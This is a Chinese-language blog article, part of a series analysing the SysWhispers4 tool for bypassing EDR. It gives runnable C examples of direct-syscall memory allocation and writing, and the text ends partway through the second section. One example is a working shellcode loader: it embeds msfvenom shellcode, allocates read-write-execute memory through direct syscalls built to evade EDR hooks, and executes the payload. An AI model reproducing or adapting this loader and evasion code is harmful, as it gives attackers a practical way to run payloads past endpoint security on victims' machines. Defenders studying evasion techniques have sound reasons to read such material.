---
title: edr绕过工具 SysWhispers4 源码分析系列(八)
url: https://mp.weixin.qq.com/s/4pQJDWcxOsXVgxERY-dgGg
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:33:16.934278
---

# edr绕过工具 SysWhispers4 源码分析系列(八)

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBnv8j0RupwXFvaz8lmCQpw2or1vs4icMpib1XYic5Sg4PsZ19DkibtkoCpziaevib4n5kVzVqpGVEGlqza85joSWz646LHxunUko0CwLg/0?wx_fmt=jpeg)

# edr绕过工具 SysWhispers4 源码分析系列(八)

原创

haidragon
haidragon

安全狗的自我修养

![]()

在小说阅读器中沉浸阅读

# ![SysWhispers：如何通过直接系统调用实现AVEDR绕过-腾讯云开发者社区-腾讯云](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnulB7zsXfOVrPU4myQNhUTL4giajbpicO4YewR5PEM5ladBSWeubnLTl85x6kQk2JIyMnXmRd9M2sNLpMtbN930cQZqO2lWQNMxw/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0)

# 官网：http://securitytech.cc

#

# 八、常见系统调用实战示例大全

本文档提供 SysWhispers4 生成的 syscall 在实际应用中的完整使用示例，涵盖内存操作、进程注入、线程创建等核心场景。每个示例都是独立可运行的完整代码，包含详细的注释和原理解析。

## 1. NtAllocateVirtualMemory 使用详解

### 1.1 函数原型

```
1. NTSTATUS NTAPI SW4_NtAllocateVirtualMemory(
2. IN HANDLE ProcessHandle,// 目标进程句柄
3. IN OUT PVOID *BaseAddress,// 基址指针（输入 NULL 让系统选择）
4. IN ULONG_PTR ZeroBits,// 保留位，必须为 0
5. IN OUT PSIZE_T RegionSize,// 区域大小指针
6. IN ULONG AllocationType,// 分配类型
7. IN ULONG Protect// 内存保护标志
8. );
```

**参数详解：**

| 参数 | 方向 | 说明 | 典型值 |
| --- | --- | --- | --- |
| ProcessHandle | IN | 目标进程句柄 | GetCurrentProcess() |
| BaseAddress | IN OUT | 基址指针 | NULL（系统分配）或指定地址 |
| ZeroBits | IN | 保留位 | 0 |
| RegionSize | IN OUT | 区域大小 | 0x1000（4KB）的倍数 |
| AllocationType | IN | 分配类型 | MEM\_COMMIT \ |
| Protect | IN | 保护标志 | PAGE\_READWRITE 等 |

**返回值：**

* `STATUS_SUCCESS` (0x00000000)：成功
* 其他 NTSTATUS 错误码

### 1.2 基础示例：分配可读写内存

```
1. #include<windows.h>
2. #include<stdio.h>
3. #include"SW4Syscalls.h"

5. BOOL AllocateReadWriteMemory(){
6. HANDLE hProcess =GetCurrentProcess();
7. PVOID baseAddress = NULL;
8. SIZE_T regionSize =0x1000;// 4KB
9. NTSTATUS status;

11. printf("[*] Allocating RW memory...\n");

13. // 分配可读写内存
14. status = SW4_NtAllocateVirtualMemory(
15. hProcess,// 当前进程
16. &baseAddress,// 由系统选择地址
17. 0,// 保留位
18. &regionSize,// 大小 4KB
19. MEM_COMMIT | MEM_RESERVE,// 提交 + 保留
20. PAGE_READWRITE      // 可读写
21. );

23. if(NT_SUCCESS(status)){
24. printf("[+] Memory allocated at: %p\n", baseAddress);
25. printf("    Size: 0x%zX bytes\n", regionSize);

27. // 测试写入
28. constchar* testString ="Hello, SysWhispers4!";
29. memcpy(baseAddress, testString, strlen(testString)+1);
30. printf("    Test write: %s\n",(char*)baseAddress);

32. // 释放内存
33. SW4_NtFreeVirtualMemory(hProcess,&baseAddress,&regionSize, MEM_RELEASE);
34. printf("[-] Memory freed\n");

36. return TRUE;
37. }else{
38. printf("[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
39. return FALSE;
40. }
41. }

43. int main(){
44. if(!SW4_Initialize()){
45. printf("[!] Initialization failed\n");
46. return1;
47. }

49. AllocateReadWriteMemory();

51. return0;
52. }
```

**输出示例：**

```
1. [*]Allocating RW memory...
2. [+]Memory allocated at:000001A2B3C40000
3. Size:0x1000 bytes
4. Test write:Hello,SysWhispers4!
5. [-]Memory freed
```

### 1.3 高级示例：分配可执行内存（Shellcode 存储）

```
1. #include<windows.h>
2. #include<stdio.h>
3. #include"SW4Syscalls.h"

5. // 示例 Shellcode：Windows x64 Calc
6. // msfvenom -p windows/x64/exec CMD=calc.exe -f c
7. unsignedchar calc_shellcode[]=
8. "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
9. "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
10. "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
11. "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
12. "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
13. "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
14. "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
15. "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
16. "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
17. "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
18. "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x28\x49\x01\xd0\x48\x8b\x00"
19. "\xd0\x48\x83\xc4\x20\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
20. "\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
21. "\x4b\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00"
22. "\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
23. "\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83"
24. "\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
25. "\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
26. "\x78\x65\x00";

28. BOOL AllocateExecutableMemory(PVOID* outBase, SIZE_T size){
29. HANDLE hProcess =GetCurrentProcess();
30. PVOID baseAddress = NULL;
31. SIZE_T regionSize = size;
32. NTSTATUS status;

34. // 分配可读可写可执行的内存
35. status = SW4_NtAllocateVirtualMemory(
36. hProcess,
37. &baseAddress,
38. 0,
39. &regionSize,
40. MEM_COMMIT | MEM_RESERVE,
41. PAGE_EXECUTE_READWRITE  // RWX 权限
42. );

44. if(NT_SUCCESS(status)){
45. printf("[+] Allocated RXW memory at: %p\n", baseAddress);
46. printf("    Size: 0x%zX bytes\n", regionSize);
47. *outBase = baseAddress;
48. return TRUE;
49. }else{
50. printf("[!] Allocation failed: 0x%08X\n", status);
51. return FALSE;
52. }
53. }

55. int main(){
56. if(!SW4_Initialize()){
57. printf("[!] Init failed\n");
58. return1;
59. }

61. PVOID shellcodeAddr = NULL;

63. // 分配内存
64. if(AllocateExecutableMemory(&shellcodeAddr,sizeof(calc_shellcode))){
65. // 复制 shellcode
66. memcpy(shellcodeAddr, calc_shellcode,sizeof(calc_shellcode));
67. printf("[+] Shellcode copied to: %p\n", shellcodeAddr);

69. // 执行 shellcode（危险操作，仅用于演示）
70. printf("[*] Executing shellcode...\n");
71. ((void(*)())shellcodeAddr)();
72. }

74. return0;
75. }
```

### 1.4 在指定地址分配内存

```
1. #include<windows.h>
2. #include<stdio.h>
3. #include"SW4Syscalls.h"

5. BOOL AllocateAtSpecificAddress(PVOID targetAddress){
6. HANDLE hProcess =GetCurrentProcess();
7. PVOID baseAddress = targetAddress;// 指定地址
8. SIZE_T regionSize =0x10000;// 64KB
9. NTSTATUS status;

11. printf("[*] Attempting to allocate at: %p\n", targetAddress);

13. status = SW4_NtAllocateVirtualMemory(
14. hProcess,
15. &baseAddress,
16. 0,
17. &regionSize,
18. MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,// 从上往下分配
19. PAGE_READWRITE
20. );

22. if(NT_SUCCESS(status)){
23. printf("[+] Successfully allocated at: %p\n", baseAddress);
24. printf("    Actual size: 0x%zX\n", regionSize);

26. // 验证地址是否接近目标
27. if((ULONG_PTR)baseAddress >=(ULONG_PTR)targetAddress -0x10000&&
28. (ULONG_PTR)baseAddress <=(ULONG_PTR)targetAddress +0x10000){
29. printf("[✓] Address is close to target!\n");
30. }

32. return TRUE;
33. }else{
34. printf("[!] Failed: 0x%08X\n", status);
35. return FALSE;
36. }
37. }

39. int main(){
40. if(!SW4_Initialize())return1;

42. // 尝试在靠近 0x7FFF00000000 的地址分配（高位地址）
43. PVOID targetAddr =(PVOID)0x7FFF00000000;
44. AllocateAtSpecificAddress(targetAddr);

46. return0;
47. }
```

## 2. NtWriteVirtualMemory 使用详解

### 2.1 函数原型

```
1. NTSTATUS NTAPI SW4_NtWriteVirtualMemory(
2. IN HANDLE ProcessHandle,// 目标进程句柄
3. IN PVOID BaseAddress OPTIONAL,// 目标基址
4. IN PVOID Buffer,// 源缓冲区
5. IN SIZE_T NumberOfBytesToWrite,// 写入字节数
6. OUT PSIZE_T NumberOfBytesWritten// 实际写入字节数（可选）
7. );
```

### 2.2 基础示例：写入数据到自身进程

```
1. #include<windows.h>
2. #include<stdio.h>
3. #include<string.h>
4. #include"SW4Syscalls.h"

6. BOOL WriteToSelf(){
7. HANDLE hProcess =GetCurrentProcess();
8. PVOID targetAddr = NULL;
9. SIZE_T regionSize =0x1000;
10. NTSTATUS status;
11. SIZE_T bytesWritten =0;

13. // 1. 分配内存
14. status = SW4_NtAllocateVirtualMemory(
15. hProcess,&targetAddr,0,&regionSize,
16. MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
17. );

19. if(!NT_SUCCESS(status)){
20. printf("[!] Allocate failed: 0x%08X\n", status);
21. return FALSE;
22. }

24. printf("[+] Allocated at: %p\n", targetAddr);

26. // 2. 准备数据
27. constchar* message ="Hello from NtWriteVirtualMemory!";
28. SIZE_T dataSize = strlen(message)+1;

30. // 3. 写入内存
31. status = SW4_NtWriteVirtualMemory(
32. hProcess,
33. targetAddr,
34. (PVOID)message,
35. dataSize,
36. &bytesWritten
37. );

39. if(NT_SUCCESS(status)){
40. printf("[+] Wrote %zu bytes to %p\n", bytesWritten, targetAddr);
41. printf("    Data: %s\n",(char*)targetAddr);

43. /...